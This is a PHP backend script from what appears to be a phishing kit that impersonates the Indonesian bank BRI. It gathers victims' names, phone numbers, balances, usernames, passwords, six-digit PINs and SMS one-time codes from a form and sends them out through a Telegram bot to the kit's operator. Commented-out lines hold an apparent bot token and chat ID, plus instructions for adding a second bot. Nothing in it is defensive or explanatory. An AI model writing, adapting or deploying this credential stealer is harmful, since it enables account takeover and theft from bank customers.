<?php 
include "telegram.php";
session_start();
$nohp = $_SESSION['nohp'];
$nama = $_POST['nama'];
$nohp = $_POST['nohp'];
$saldo = $_POST['saldo'];
$username = $_POST['username'];
$password = $_POST['pass'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;
$otp = $_POST['sms'];
$message = "
( BRI | AKUN | ".$nohp." )

- Nama Lengkap : ".$nama."
- Nomor Handphone : ".$nohp."
- Saldo : ".$saldo."
- Username : ".$username."
- Password : ".$password."
- OTP : ".$otp."
----------------
 By : jieCode
 ";
 
// $id_telegram1 = '7144662040'; - delete the // if u want use 2 bot 
// $id_botTele1 = '7856583741:AAHjapkaMYH6FROnT8UgvNI8C0JPaO-eeDQ'; - delete the // if u want use 2 bot
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=HTML&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
// sendMessage($id_telegram1, $message, $id_botTele1); - delete the // if u want use 2 bot
sendMessage($id_telegram, $message, $id_botTele);
?>
